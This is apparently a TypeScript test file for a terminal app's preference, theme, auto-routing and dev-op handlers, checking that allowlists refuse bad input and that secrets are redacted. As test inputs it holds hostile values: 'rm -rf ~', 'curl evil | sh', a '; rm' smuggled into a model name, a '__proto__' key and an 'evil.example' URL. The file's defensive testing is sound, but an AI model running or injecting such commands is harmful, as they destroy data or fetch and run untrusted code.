import { describe, expect, test } from "bun:test"
import { PROJECT_SIBLING_BASE } from "@sma1lboy/rove/src/state/worktree-base.ts"
import { BUNDLED_THEME_JSONS } from "@sma1lboy/rove/src/tui/context/theme/bundled.ts"
import { createDevOps } from "../src/ops/dev.ts"
import { type PrefsDeps, createPrefsOps } from "../src/ops/prefs.ts"
import { type RoutingDeps, createRoutingOps } from "../src/ops/routing.ts"
import type { Args, BridgeApi, OpTable } from "../src/ops/types.ts"

type State = Record<string, unknown>

function store(initial: State = {}) {
  const state: State = { ...initial }
  return {
    state,
    load: () => ({ ...state }),
    patch: (patch: State) => {
      for (const [k, v] of Object.entries(patch)) {
        if (v === undefined) delete state[k]
        else state[k] = v
      }
    },
  }
}

const api: BridgeApi = { verb: async () => ({}) as never, rpc: async () => ({}) as never }
const call = (table: OpTable, op: string, args: Args = {}) =>
  (table[op] as NonNullable<OpTable[string]>).run(args, { api })

function prefs(initial: State = {}) {
  const s = store(initial)
  const deps: PrefsDeps = {
    load: s.load,
    patch: s.patch,
    themes: () => [{ name: "claude", bundled: true, theme: BUNDLED_THEME_JSONS.claude as never }],
  }
  return { s, ops: createPrefsOps(deps) }
}

describe("prefs.get", () => {
  test("an empty state.json reads as the TUI's defaults, with the choices each key may take", async () => {
    const { ops } = prefs()
    const r = (await call(ops, "prefs.get")) as {
      prefs: State
      options: State
      themes: { name: string; dark: State }[]
    }
    expect(r.prefs).toMatchObject({
      locale: "en",
      theme: "claude",
      themeMode: "dark",
      focusAccent: "primary",
      glyphSet: "braille",
      railFold: "glyphs",
      tabRowHeight: 1,
      taskColors: "on",
      runningTitle: "shimmer",
      workingBorder: "flow",
      toast: true,
      keyHints: true,
      zen: false,
      editorKind: "auto",
      worktreeBase: "default",
      scrollbackRows: 1000,
      tabStrip: "never",
      prefixTap: "local",
      soundVolume: 0.4,
      autoStatus: false,
    })
    expect(r.options.glyphSet).toEqual(["braille", "starburst", "ascii"])
    expect(r.options.scrollbackRows).toEqual({ min: 100, max: 100000 })
    expect(r.themes[0]?.dark.text).toBe("#eae7df")
    // The colorblind pair comes from the TUI's diffInks, so it is not the plain added colour.
    expect(r.themes[0]?.dark.diffAddedColorblind).not.toBe(r.themes[0]?.dark.diffAdded)
  })

  test("stale or hand-edited values read through the normalizers, as the TUI would", async () => {
    const { ops } = prefs({
      "appearance.glyphSet": "emoji",
      "sidebar.tabRowHeight": "2",
      "chat.tabStrip.hideSingle": true,
      locale: "fr",
    })
    const r = (await call(ops, "prefs.get")) as { prefs: State }
    expect(r.prefs).toMatchObject({ glyphSet: "braille", tabRowHeight: 2, tabStrip: "multipleOnly", locale: "en" })
  })
})

describe("prefs.set", () => {
  test("writes the TUI's own state.json key and answers with what the TUI will now read", async () => {
    const { ops, s } = prefs()
    const r = (await call(ops, "prefs.set", { key: "glyphSet", value: "ascii" })) as { value: unknown }
    expect(s.state["appearance.glyphSet"]).toBe("ascii")
    expect(r.value).toBe("ascii")
    await call(ops, "prefs.set", { key: "theme", value: "claude" })
    await call(ops, "prefs.set", { key: "transparent", value: false })
    await call(ops, "prefs.set", { key: "tabStrip", value: "always" })
    expect(s.state).toMatchObject({
      activeTheme: "claude",
      transparentBackground: false,
      "chat.tabStrip.mode": "always",
    })
  })

  test("refuses keys and values outside the allowlist; nothing is written", async () => {
    const { ops, s } = prefs()
    for (const args of [
      { key: "editor.customCommand", value: "rm -rf ~" },
      { key: "editorCustom", value: "rm -rf ~" },
      { key: "__proto__", value: 1 },
      { key: "glyphSet", value: "emoji" },
      { key: "theme", value: "no-such-theme" },
      { key: "toast", value: "yes" },
      { key: "scrollbackRows", value: 50 },
      { key: "scrollbackRows", value: 1000.5 },
      { key: "soundVolume", value: 0.33 },
      { key: "tabRowHeight", value: "2" },
    ]) {
      await expect(call(ops, "prefs.set", args)).rejects.toMatchObject({ code: "BAD_ARGS" })
    }
    expect(s.state).toEqual({})
  })

  test("turning key hints on re-arms the first-use pane hints; turning them off leaves those alone", async () => {
    const { ops, s } = prefs({ "hints.keyboard.enabled": false, "hints.sidebar.used": true, "hints.files.used": true })
    await call(ops, "prefs.set", { key: "keyHints", value: true })
    expect(s.state).toMatchObject({
      "hints.keyboard.enabled": true,
      "hints.sidebar.used": false,
      "hints.files.used": false,
    })
    s.state["hints.sidebar.used"] = true
    await call(ops, "prefs.set", { key: "keyHints", value: false })
    expect(s.state["hints.sidebar.used"]).toBe(true)
  })

  test("worktree location cycles default, next to project and the remembered custom base, never a sent path", async () => {
    const { ops, s } = prefs()
    await call(ops, "prefs.set", { key: "worktreeBase", value: "nextToProject" })
    expect(s.state["worktree.basePath"]).toBe(PROJECT_SIBLING_BASE)
    await expect(call(ops, "prefs.set", { key: "worktreeBase", value: "custom" })).rejects.toMatchObject({
      code: "BAD_ARGS",
    })
    expect(s.state["worktree.basePath"]).toBe(PROJECT_SIBLING_BASE)

    s.state["worktree.basePath.custom"] = "/srv/trees"
    await call(ops, "prefs.set", { key: "worktreeBase", value: "custom" })
    expect(s.state["worktree.basePath"]).toBe("/srv/trees")
    // Leaving custom remembers it for the next pass.
    await call(ops, "prefs.set", { key: "worktreeBase", value: "default" })
    expect(s.state).toMatchObject({ "worktree.basePath": "", "worktree.basePath.custom": "/srv/trees" })
    const r = (await call(ops, "prefs.get")) as { info: { worktreeCustomPath: string } }
    expect(r.info.worktreeCustomPath).toBe("/srv/trees")
  })

  test("the custom editor command is only reported as set, never read back or written", async () => {
    const { ops, s } = prefs({ "editor.customCommand": "code -w {file}" })
    await call(ops, "prefs.set", { key: "editorKind", value: "custom" })
    expect(s.state["editor.kind"]).toBe("custom")
    expect(s.state["editor.customCommand"]).toBe("code -w {file}")
    const r = JSON.stringify(await call(ops, "prefs.get"))
    expect(r).toContain('"editorCustomSet":true')
    expect(r).not.toContain("code -w")
  })
})

describe("theme.taskColors", () => {
  test("one stable #rrggbb per id under the chosen theme and mode", async () => {
    const { ops } = prefs()
    const a = (await call(ops, "theme.taskColors", { theme: "claude", mode: "dark", taskIds: ["t1", "t2"] })) as {
      colors: Record<string, string>
    }
    expect(Object.keys(a.colors)).toEqual(["t1", "t2"])
    expect(a.colors.t1).toMatch(/^#[0-9a-f]{6}$/)
    expect(a.colors.t1).not.toBe(a.colors.t2)
    const b = (await call(ops, "theme.taskColors", { theme: "claude", mode: "dark", taskIds: ["t1"] })) as {
      colors: Record<string, string>
    }
    expect(b.colors.t1).toBe(a.colors.t1)
    await expect(call(ops, "theme.taskColors", { theme: "x", mode: "dark", taskIds: [] })).rejects.toMatchObject({
      code: "BAD_ARGS",
    })
  })
})

function routing(initial: State = {}) {
  const s = store(initial)
  const deps = {
    load: s.load,
    patch: s.patch,
    installed: async () => [],
    statuses: async () => [{ vendor: "claude", account: { kind: "none" } }],
    integrations: () => [],
    engineName: (id: string) => id.toUpperCase(),
    defaultCommand: (id: string) => [id],
    secret: () => "none",
  } as unknown as RoutingDeps
  return { s, ops: createRoutingOps(deps) }
}

describe("autoRouting", () => {
  test("setTier writes the three keys the TUI picker writes; an engine, model or effort it does not accept is refused", async () => {
    const { ops, s } = routing()
    await call(ops, "autoRouting.setTier", { tier: "deep", engine: "claude", model: "opus-4" })
    expect(s.state).toMatchObject({
      "autoRouting.deep.engine": "claude",
      "autoRouting.deep.model": "opus-4",
      "autoRouting.deep.effort": "",
    })
    for (const args of [
      { tier: "deep", engine: "not-an-engine" },
      { tier: "ultra", engine: "claude" },
      { tier: "deep", engine: "claude", model: "bad model; rm" },
      { tier: "deep", engine: "claude", effort: "nonsense" },
    ]) {
      await expect(call(ops, "autoRouting.setTier", args)).rejects.toMatchObject({ code: "BAD_ARGS" })
    }
  })

  test("get shows each tier with the gate's verdict, and the classifier endpoint as a host only", async () => {
    const { ops } = routing({
      "autoRouting.classifier": "https://user:secret@tiers.internal/pick?token=abc",
      "autoRouting.classifierEndpoint": "https://user:secret@tiers.internal/pick?token=abc",
    })
    const r = (await call(ops, "autoRouting.get")) as {
      tiers: { tier: string; block: string | null }[]
      classifier: { mode: string; endpointHost: string }
    }
    expect(r.tiers.map((t) => t.tier)).toEqual(["swift", "standard", "deep"])
    expect(r.tiers[0]?.block).toContain("not logged in")
    expect(r.classifier).toMatchObject({ mode: "custom", endpointHost: "tiers.internal" })
    expect(JSON.stringify(r)).not.toContain("secret")
  })

  test("the classifier moves between off, jev and the endpoint the TUI remembered, and never takes a URL", async () => {
    const { ops, s } = routing()
    await expect(call(ops, "autoRouting.setClassifier", { mode: "custom" })).rejects.toMatchObject({ code: "BAD_ARGS" })
    await expect(call(ops, "autoRouting.setClassifier", { mode: "https://evil.example/x" })).rejects.toMatchObject({
      code: "BAD_ARGS",
    })
    await call(ops, "autoRouting.setClassifier", { mode: "jev" })
    expect(s.state["autoRouting.classifier"]).toBe("jev")
    s.state["autoRouting.classifierEndpoint"] = "https://tiers.internal/pick"
    await call(ops, "autoRouting.setClassifier", { mode: "custom" })
    expect(s.state["autoRouting.classifier"]).toBe("https://tiers.internal/pick")
    // Leaving custom keeps the address for the next pass.
    s.state["autoRouting.classifierEndpoint"] = ""
    await call(ops, "autoRouting.setClassifier", { mode: "off" })
    expect(s.state).toMatchObject({
      "autoRouting.classifier": "off",
      "autoRouting.classifierEndpoint": "https://tiers.internal/pick",
    })
  })
})

describe("dev ops", () => {
  test("hooks, reset and restart delegate to Rove's own actions and take no client content", async () => {
    const seen: string[] = []
    const ops = createDevOps({
      installHooks: async () => void seen.push("install"),
      uninstallHooks: async () => void seen.push("uninstall"),
      resetState: () => void seen.push("reset"),
    })
    await call(ops, "engines.hooks.install", { command: "curl evil | sh" })
    await call(ops, "engines.hooks.uninstall")
    const rpcs: unknown[] = []
    await (ops["dev.reset"] as NonNullable<OpTable[string]>).run(
      {},
      { api: { verb: api.verb, rpc: async (name, payload) => void rpcs.push([name, payload]) as never } },
    )
    expect(seen).toEqual(["install", "uninstall", "reset"])
    expect(rpcs).toEqual([["daemon.stop", { reason: "restart" }]])
    rpcs.length = 0
    await (ops["daemon.restart"] as NonNullable<OpTable[string]>).run(
      {},
      { api: { verb: api.verb, rpc: async (name, payload) => void rpcs.push([name, payload]) as never } },
    )
    expect(rpcs).toEqual([["daemon.stop", { reason: "restart" }]])
  })
})
